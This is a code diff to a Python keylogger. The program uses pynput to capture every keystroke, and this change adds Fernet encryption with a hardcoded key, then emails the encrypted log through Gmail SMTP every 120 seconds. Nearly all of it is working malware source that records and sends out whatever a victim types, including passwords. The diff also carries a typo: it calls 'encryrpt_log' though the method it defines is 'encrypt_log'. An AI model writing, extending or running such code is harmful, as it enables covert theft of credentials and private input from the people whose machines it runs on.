@@ -1,13 +1,14 @@
 from pynput.keyboard import Key, Listener
 from smtplib import SMTP, SMTPAuthenticationError
 from threading import Timer
-
+from cryptography.fernet import Fernet
 
 EMAIL_ADDRESS = "YOUR_EMAIL"
 EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
-SEND_REPORT_EVERY = 60  # seconds
+SEND_REPORT_EVERY = 120  # seconds
 EMAIL_HOST = "smtp.gmail.com"
 PORT = 587
+SECRET = b"F1C7ZQ1ThDSpmw13fKWT_gS-rjkl0HwdDo4Wxo63R2k="
 
 
 class Keylogger:
@@ -18,11 +19,12 @@ class Keylogger:
         Key.tab: "[TAB]",
         Key.backspace: "[BACKSPACE]"}
 
-    def __init__(self, email, password, time_interval):
+    def __init__(self, email, password, time_interval, secret):
         self.interval = time_interval
         self.log = ""
         self.email = email
         self.password = password
+        self.f = Fernet(secret)
 
     def update_log(self, str):
         self.log += str
@@ -34,13 +36,16 @@ class Keylogger:
             name = Keylogger.ks.get(key, str(key))
         self.update_log(name.replace("'", ""))
 
+    def encrypt_log(self):
+        return self.f.encrypt(str.encode(f"\n\n{self.log}"))
+
     def send_email(self):
         server = SMTP(host=EMAIL_HOST, port=PORT)
         # connect to the SMTP server as TLS mode
         server.starttls()
         try:
             server.login(self.email, self.password)
-            server.sendmail(self.email, self.email, f"\n\n{self.log}")
+            server.sendmail(self.email, self.email, self.encryrpt_log())
         except SMTPAuthenticationError:
             print("Username and Password not accepted.")
         finally:
@@ -60,7 +65,7 @@ class Keylogger:
 
 
 def main():
-    kl = Keylogger(EMAIL_ADDRESS, EMAIL_PASSWORD, SEND_REPORT_EVERY)
+    kl = Keylogger(EMAIL_ADDRESS, EMAIL_PASSWORD, SEND_REPORT_EVERY, SECRET)
     kl.start()
 
 
